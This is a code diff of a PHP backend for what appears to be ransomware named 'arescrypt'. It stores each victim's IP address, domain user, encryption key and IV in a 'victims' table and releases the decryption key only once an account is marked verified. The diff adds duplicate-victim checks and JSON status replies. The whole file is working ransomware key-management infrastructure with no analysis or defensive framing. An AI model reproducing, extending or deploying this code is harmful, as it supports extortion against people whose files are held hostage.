@@ -6,7 +6,7 @@
 define("db_server", "localhost");
 define("db_name", "arescrypt");
 define("db_username", "root");
-define("db_password", "toor");
+define("db_password", "");
 
 // Create connection
 $mysqli = new mysqli(db_server, db_username, db_password, db_name);
@@ -16,15 +16,14 @@ if ($mysqli->connect_error) {
     // connection failed
     die("Connection failed: " . $mysqli->connect_error);
 }
-// echo "Connected to " . db_server . "\\" . db_name . " successfully.";
 // connected successfully
 
 if ($_SERVER['REQUEST_METHOD'] == "GET") {
 	// echo "Loaded through " . $_SERVER['REQUEST_METHOD'] ." request";
-	$verifiedAccount = false;
+	$verifiedAccount = false; // False by default to prevent leaks
 
 	if (isset($_GET['uniqueKey']) && isset($_GET['userDomUser'])) {
-		$stmt = $mysqli->prepare('SELECT verifiedAccount FROM `victims` WHERE uniqueKey = ? AND userDomUser = ? LIMIT 1');
+		$stmt = $mysqli->prepare('SELECT * FROM `victims` WHERE uniqueKey = ? AND userDomUser = ? LIMIT 1');
 		if ( !$stmt )
 			$error[] = $mysqli->error;
 		else if ( !$stmt->bind_param('ss', $_GET['uniqueKey'], $_GET['userDomUser']) )
@@ -38,8 +37,9 @@ if ($_SERVER['REQUEST_METHOD'] == "GET") {
 				$encKey = $row["encKey"];
 				$encIV = $row["encIV"];
 			}
+
 			if ($verifiedAccount)
-				echo json_encode(array("encKey" => $encKey, "encIV" => $encIV, "verifiedAccount" => $verifiedAccount));
+				echo json_encode(array("verifiedAccount" => $verifiedAccount, "encKey" => $encKey, "encIV" => $encIV));
 			else
 				echo json_encode(array("verifiedAccount" => $verifiedAccount));
 		}
@@ -80,14 +80,32 @@ reqDate TIMESTAMP
 		die("Please correct 'encIV'");
 	}
 
-	$stmt = $mysqli->prepare("INSERT INTO victims (uniqueKey, userIPAddr, userDomUser, encKey, encIV) VALUES (?, ?, ?, ?, ?)");
-	$stmt->bind_param('sssss', $uniqueKey, $userIPAddr, $userDomUser, $encKey, $encIV);
+	$accountExists = false;
+	$stmt = $mysqli->prepare("SELECT userID FROM `victims` WHERE uniqueKey = ? AND userDomUser = ? LIMIT 1");
+	$stmt->bind_param('ss', $uniqueKey, $userDomUser);
+	$stmt->execute();
+	$result = $stmt->get_result();
+	foreach ($result as $row) {
+		$userID = $row["userID"];
 
-	if ($stmt->execute() === true) {
-		$stmt->close();
-		$mysqli->close();
+		// check if we got something
+		if ($userID >= 0)
+			$accountExists = true;
+	}
+
+	if ($accountExists == false) {
+		$stmt = $mysqli->prepare("INSERT INTO victims (uniqueKey, userIPAddr, userDomUser, encKey, encIV) VALUES (?, ?, ?, ?, ?)");
+		$stmt->bind_param('sssss', $uniqueKey, $userIPAddr, $userDomUser, $encKey, $encIV);
+
+		if ($stmt->execute() === true)
+			echo json_encode(array("creationSuccess" => true));
+		else
+			echo json_encode(array("creationSuccess" => false));
 	} else
-		echo $mysqli->error;
+		echo json_encode(array("creationSuccess" => false));
+
+	$stmt->close();
+	$mysqli->close();
 }
 
 ?>
